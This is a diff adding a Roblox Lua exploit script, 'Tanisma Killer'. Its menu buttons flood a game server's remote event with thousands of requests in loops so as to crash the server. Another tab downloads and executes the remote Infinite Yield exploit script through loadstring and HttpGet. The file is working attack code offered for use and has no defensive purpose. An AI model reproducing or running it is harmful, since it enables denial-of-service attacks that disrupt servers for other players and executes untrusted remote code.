@@ -1,0 +1,37 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Tanisma Killer", "BloodTheme")
+
+-- ANA
+local main = Window:NewTab("Crash")
+local Section1 = main:NewSection("Crash Server")
+
+Section1:NewButton("ATOM BOMB", "This command send server 7000 request.", function()
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+wait(10)
+for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+end)
+
+Section1:NewButton("C4", "This command send server 4000 request.", function()
+    for i = 1, 4000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+wait(5)
+for i = 1, 3000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+end)
+local HDAdminCrash = Window:NewTab("HD Admin Crash")
+
+local hdadminsection = HDAdminCrash:NewSection("EK Scriptler")
+hdadminsection:NewButton("InfiniteYield", "ınfiniteYield", function ()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+end)
+
+local credit = Window:NewTab("Credit")
+
+local Section2 = credit:NewSection("Cuersy#6627 / dats#4088")
